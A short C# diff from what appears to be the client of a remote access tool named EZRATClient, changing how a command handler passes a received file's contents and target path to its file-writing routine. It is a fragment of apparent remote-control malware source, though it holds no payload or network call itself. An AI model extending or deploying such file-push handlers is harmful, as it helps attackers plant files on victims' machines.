@@ -134,8 +134,7 @@ namespace EZRATClient.Core
                 text = text.Substring(7);
                 string[] lines = text.Split(';');
                 string path = lines[0];
-                byte[] recFile = Encoding.Default.GetBytes(lines[1]);
-                CommandExecutor.ReceiveFile(recFile, path);
+                CommandExecutor.ReceiveFile(lines[1], path);
             }
             else if (text.StartsWith("dtfile;"))
             {
